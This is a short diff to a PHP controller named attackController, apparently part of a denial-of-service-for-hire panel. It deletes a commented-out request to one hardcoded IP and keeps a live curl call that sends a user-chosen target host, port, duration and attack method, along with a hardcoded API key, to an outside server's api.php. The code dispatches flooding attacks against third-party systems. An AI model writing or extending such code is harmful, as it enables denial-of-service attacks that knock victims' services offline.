@@ -37,16 +37,6 @@ class attackController extends Controller
             'method' => ['required', 'string']
         ]);
 
-        $client = new Client();
-        // $client->request('POST', 'http://77.83.247.18/speed.php', [
-        //     'form_params' => [
-        //         'host' => $request->ip,
-        //         'port' => $request->port,
-        //         'time' => $request->length,
-        //         'method' => $request->method
-        //     ]
-        // ]);
-
         $url = curl_init();
         curl_setopt($url, CURLOPT_URL,'http://89.171.139.72/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method='.$request->method.'&key=wyBd2fri35');
         curl_setopt($url, CURLOPT_RETURNTRANSFER, true);
